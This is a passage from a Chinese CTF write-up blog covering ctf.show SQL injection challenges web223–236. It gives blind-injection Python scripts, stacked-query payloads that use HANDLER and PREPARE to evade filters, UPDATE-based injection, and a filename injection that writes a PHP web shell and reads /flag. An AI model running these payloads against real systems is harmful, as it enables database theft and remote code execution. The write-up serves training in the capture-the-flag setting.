class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#import time</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateNum</span>(<span class="params">num</span>):</span><br><span class="line">    res = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num-<span class="number">1</span>):</span><br><span class="line">            res += <span class="string">&quot;+true&quot;</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ce009cf2-8652-4737-ba07-b3bfc3bc3a4a.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagas&#x27;&quot;</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">&quot;select flagasabc from ctfshow_flagas&quot;</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr((&#123;&#125;),&#123;&#125;,true))=(&#123;&#125;),username,false)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#计数</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        result_num=generateNum(i)</span><br><span class="line">        result=generateNum(j)</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;u&#x27;</span> : payload.<span class="built_in">format</span>(sql,result_num,result)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = requests.get(url = url, params = params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;userAUTO&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*] 开始盲注第&#123;&#125;位&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[*] flag is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#ctfshow&#123;728dd1b0-7547-401d-b358-2d2207f3d13c&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>太重量级了，我拼个半天那个测试payload就是不对，true拼接咋拼咋不对，草泥马，傻逼sql注入你妈妈死了。<br>不用asci拼到substr里就是不行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/?u=<span class="keyword">if</span>(substr((database()),(true),true)=(<span class="string">&#x27;c&#x27;</span>),username,<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><p>第一个就行<br>第二个就不行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://000cd6ed-c9e2-47c0-8f98-045fe552c6cd.challenge.ctf.show/api/?u=<span class="keyword">if</span>(mid((database()),(true+true),(true))=(<span class="string">&#x27;c&#x27;</span>),username,<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h1><p>似乎不是sql注入，而是文件上传。<br> 实际上robots.txt能扫出来有修改密码的位置，修改密码之后登录是一个文件上传。<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690440405918-9387ad36-0b95-4e7a-8698-b57c6f13a676.png" alt="20201128094552251.png"><br>文件名注入，写入文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C64File <span class="string">&quot;&#x27;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &#x27;/var/www/html/1.php&#x27;; --+</span></span><br></pre></td></tr></table></figure><p>保存为：<code>payload.bin</code>其中十六进制为：<code>&lt;?=``$_GET[1]?``&gt;</code>，然后访问1.php传参1RCE。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="number">1</span>.php?<span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h1><h3 id="handler，预处理"><a href="#handler，预处理" class="headerlink" title="handler，预处理"></a>handler，预处理</h3><blockquote><p><a href="https://blog.csdn.net/solitudi/article/details/107823398">https://blog.csdn.net/solitudi/article/details/107823398</a><br><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a> handler官方文档</p></blockquote><p>没过滤show字符：<code>ctfshow&#39;;show tables;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;\u67e5\u8be2\u6210\u529f&quot;</span>,<span class="string">&quot;count&quot;</span>:<span class="number">1</span>,<span class="string">&quot;data&quot;</span>:[&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;ctfshow&quot;</span>,<span class="string">&quot;pass&quot;</span>:<span class="string">&quot;ctfshow&quot;</span>&#125;,&#123;<span class="string">&quot;Tables_in_ctfshow_web&quot;</span>:<span class="string">&quot;ctfshow_flagasa&quot;</span>&#125;,&#123;<span class="string">&quot;Tables_in_ctfshow_web&quot;</span>:<span class="string">&quot;ctfshow_user&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><p>用handler读取：<code>username=ctfshow&#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;\u67e5\u8be2\u6210\u529f&quot;</span>,<span class="string">&quot;count&quot;</span>:<span class="number">1</span>,<span class="string">&quot;data&quot;</span>:[&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;ctfshow&quot;</span>,<span class="string">&quot;pass&quot;</span>:<span class="string">&quot;ctfshow&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;flagas&quot;</span>:<span class="string">&quot;ctfshow&#123;83599e7a-ba35-4ce6-88a1-6e1c69755ccb&#125;&quot;</span>,<span class="string">&quot;info&quot;</span>:<span class="string">&quot;you get it&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><h2 id="至于什么是handler："><a href="#至于什么是handler：" class="headerlink" title="至于什么是handler："></a>至于什么是handler：</h2><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭，使用方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first#</span></span><br></pre></td></tr></table></figure><h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p>预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。　MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE name <span class="keyword">from</span> <span class="string">&#x27;[my sql sequece]&#x27;</span>;   <span class="comment">//预定义SQL语句</span></span><br><span class="line">EXECUTE name;  <span class="comment">//执行预定义SQL语句</span></span><br><span class="line">(DEALLOCATE || DROP) PREPARE name;  <span class="comment">//删除预定义SQL        语句</span></span><br></pre></td></tr></table></figure><p>字符串预处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt1 FROM <span class="string">&#x27;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#x27;</span>;</span><br><span class="line">ET @a = <span class="number">3</span>;</span><br><span class="line">SET @b = <span class="number">4</span>;                                                   </span><br><span class="line">EXECUTE stmt1 USING @a, @b;</span><br></pre></td></tr></table></figure><p>变量定义预处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SET @s = <span class="string">&#x27;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#x27;</span>;</span><br><span class="line">PREPARE stmt2 FROM @s;</span><br><span class="line">SET @c = <span class="number">6</span>;</span><br><span class="line">ET @d = <span class="number">8</span>;</span><br><span class="line">EXECUTE stmt2 USING @c, @d;</span><br><span class="line">DEALLOCATE PREPARE stmt2;</span><br></pre></td></tr></table></figure><p>利用concat绕过过滤，然后将后面的database()替换为需要执行的语句。别忘记中间的空格。<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=ctfshow<span class="string">&#x27;;PREPARE aaa from concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>elect<span class="string">&#x27;, &#x27;</span> flagas <span class="keyword">from</span> ctfshow_flagasa<span class="string">&#x27;);EXECUTE aaa;</span></span><br></pre></td></tr></table></figure><p>或者用concat得到的连接字符也可以代替select：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=ctfshow<span class="string">&#x27;;PREPARE aaa from concat(char(115,101,108,101,99,116), &#x27;</span> flagas <span class="keyword">from</span> ctfshow_flagasa<span class="string">&#x27;);EXECUTE aaa;</span></span><br></pre></td></tr></table></figure><h1 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h1><p>我们之前在web224中的文件上传就使用了转换为十六进制然后将内容前加上0x。再加上预处理。<br>十六进制转换可以这样写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line">hex_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch in text:</span><br><span class="line">    hex_ch = <span class="title function_ invoke__">hex</span>(<span class="title function_ invoke__">ord</span>(ch)).<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    hex_str += hex_ch</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;原文：\n&quot;</span>+text)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;十六进制（不带0x）：\n&quot;</span>+hex_str)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;十六进制（带0x）：\n&quot;</span>+<span class="string">&quot;0x&quot;</span>+hex_str)</span><br></pre></td></tr></table></figure><p>我们将需要预编译的语句转换为十六进制。然后再传入比如：<br>show被过滤掉了，不要出现。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">十六进制前：</span><br><span class="line">select <span class="title function_ invoke__">database</span>()</span><br><span class="line">转换后：</span><br><span class="line"><span class="number">0x73656c6563742064617461626173652829</span></span><br><span class="line">加上预编译语句：</span><br><span class="line">ctf<span class="string">&#x27;;PREPARE aaa from 0x73656c6563742064617461626173652829;EXECUTE aaa;--+</span></span><br></pre></td></tr></table></figure><p>然后再将中间的内容转换为需要的查询语句即可。<br>比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>()</span><br><span class="line">?username=ctf<span class="string">&#x27;;PREPARE aaa from 0x73656c656374207461626c655f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;EXECUTE aaa;--+</span></span><br></pre></td></tr></table></figure><p>查列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select column_name <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;ctfsh_ow_flagas&#x27;</span></span><br><span class="line">?username=ctf<span class="string">&#x27;;PREPARE aaa from 0x73656c65637420636f6c756d6e5f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c6167617327;EXECUTE aaa;--+</span></span><br></pre></td></tr></table></figure><p>查内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select flagasb <span class="keyword">from</span> ctfsh_ow_flagas</span><br><span class="line">?username=ctf<span class="string">&#x27;;PREPARE aaa from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE aaa;--+</span></span><br></pre></td></tr></table></figure><p>就能查到flag了。</p><h1 id="web227、web228-web230"><a href="#web227、web228-web230" class="headerlink" title="web227、web228-web230"></a>web227、web228-web230</h1><blockquote><p><a href="https://blog.csdn.net/qq_41573234/article/details/80411079">https://blog.csdn.net/qq_41573234/article/details/80411079</a></p></blockquote><p>他这里定义了自定义函数，所以需要去查询：<code>information_schema.Routines</code>这个：<br>其中的getFlag函数会调用flag 。也就是说直接<code>1&#39;;call getflag()</code>也可以<br>但其实这里已经显示出了flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690450427521-41d6da19-84df-4400-932d-8186fd04e438.png" alt="image.png"></p><h1 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h1><h3 id="update盲注"><a href="#update盲注" class="headerlink" title="update盲注"></a>update盲注</h3><p>这里需要开出来两个页面，一个负责修改（<code>/api/</code>），一个负责查看（<code>/update.php</code>）。直接修改内容，<br>比如在修改页面中传参：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;,username=database() where 1=1#&amp;username=1</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690461441854-8098f695-7156-4f77-a11f-4b87bc4fd815.png" alt="image.png"><br>运行之后返回查看页面发现被更新了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690461474262-de625929-36e1-4802-b43b-a5f9fffc57d3.png" alt="image.png"><br>然后就依次插入查询语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">banlist,ctfshow_user,flaga</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flaga<span class="string">&#x27;) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">id,flagas,info</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;,username=(select flagas from flaga) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">ctfshow&#123;bda6ff95-49e5-4832-98ef-5f2156f74200&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h1><p>这个遇上一个的差别就是多个md5的括号需要闭合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">banlist,ctfshow_user,flagaa</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;),username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flagaa<span class="string">&#x27;) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">id,flagass,info</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">1</span><span class="string">&#x27;),username=(select flagass from flagaa) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string">ctfshow&#123;d980485f-5f60-4558-a646-0c538bc3b9a1&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h1><p>盲注python。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure><p>我们能注意到当输入密码的值为第一次出现时且正确时，后面的结果会出现<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690464682345-2a7b7d80-3e4d-4124-aefd-9a98db2a726d.png" alt="image.png"><br>但是如果后面为0或者出现过一次则出现<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690464738476-4e900a40-1db3-4449-b894-43c55ffd9137.png" alt="image.png">、<br>编写脚本即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL布尔盲注.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/27 21:10   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = r<span class="string">&#x27;http://9a69458e-791c-4ebd-abe9-45cc89eaf042.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;ctfshow&#x27;and+if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;ctfshow&#x27;and+if(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag233333&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;ctfshow&#x27;and+if(mid((select flagass233 from flag233333),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j in str1:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.<span class="title function_ invoke__">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="title function_ invoke__">str</span>(random.<span class="title function_ invoke__">random</span>())</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.<span class="title function_ invoke__">post</span>(url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> r<span class="string">&#x27;成功&#x27;</span> in r.<span class="title function_ invoke__">json</span>()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h1><p>单引号被过滤了，这里用了一个<code>\</code>来逃逸。<br>就比如原语句是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>插入之后的语句是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;username&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>然后pass张的内容就是<code>&#39; where username =</code><br>可能这么讲会听不太懂，就是将&#39;当作转义的’ 然后和后面的单引号闭合：<br><code>update ctfshow_user set pass = &#39;\&#39; where username = &#39;username&#39;;</code><br>也就变为了：<br><code>update ctfshow_user set pass = &#39;&#39; where username = &#39;username&#39;</code><br>测试payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select <span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.columns where table_schema=<span class="title function_ invoke__">database</span>())--+</span><br><span class="line">  banlist,ctfshow_user,ctfshow_user,flag23a</span><br></pre></td></tr></table></figure><p>这里过滤掉了单引号，但是不闭合就查询不到，那就用十六进制来代替一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select <span class="title function_ invoke__">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="number">0x666c6167323361</span>)--+</span><br><span class="line">  id,flagass23s3,info</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select flagass23s3 <span class="keyword">from</span> flag23a)--+</span><br><span class="line">  ctfshow&#123;a4682f2f-<span class="number">3</span>c53-<span class="number">464</span>d-<span class="number">8733</span>-<span class="number">7</span>d88487cb1f5&#125;</span><br></pre></td></tr></table></figure><h1 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h1><blockquote><p><a href="https://www.jb51.net/article/134678.htm">https://www.jb51.net/article/134678.htm</a> mysql统计信息<br><a href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a> 无列名注入</p></blockquote><h3 id="过滤了or-‘-information表的替代方法"><a href="#过滤了or-‘-information表的替代方法" class="headerlink" title="过滤了or  ‘ information表的替代方法"></a>过滤了or  ‘ information表的替代方法</h3><p>这里不只是or关键字不能用，连带着information也不能用了，因此也就需要用你别的查询方法了。<br><code>mysql.innodb_table_stats</code><br>比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select <span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> mysql.innodb_table_stats where database_name=<span class="title function_ invoke__">database</span>())--+</span><br><span class="line">  banlist,ctfshow_user,flag23a1</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select b <span class="keyword">from</span> (select <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> union select * <span class="keyword">from</span> flag23a1 limit <span class="number">1</span>,<span class="number">1</span>)a</span><br><span class="line">  ctfshow&#123;<span class="number">9970</span>dea2-cadb-<span class="number">42</span>d7-<span class="number">8</span>c3b-a54b2ea469d1&#125;</span><br></pre></td></tr></table></figure><p>或者用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=,username=(select `<span class="number">2</span>` <span class="keyword">from</span>(select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> union select * <span class="keyword">from</span> flag23a1 limit <span class="number">1</span>,<span class="number">1</span>)a)-- - &amp;password=\</span><br><span class="line">ctfshow&#123;<span class="number">9970</span>dea2-cadb-<span class="number">42</span>d7-<span class="number">8</span>c3b-a54b2ea469d1&#125;</span><br></pre></td></tr></table></figure><p>无列名这种特殊注入都可以。</p><h1 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h1><p>还过滤掉了flag这次 但没啥用 绕过flag的策略有很多。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=\&amp;username=,username=(select <span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> mysql.innodb_table_stats where database_name=<span class="title function_ invoke__">database</span>())--+</span><br><span class="line">banlist,ctfshow_user,flaga</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password<span 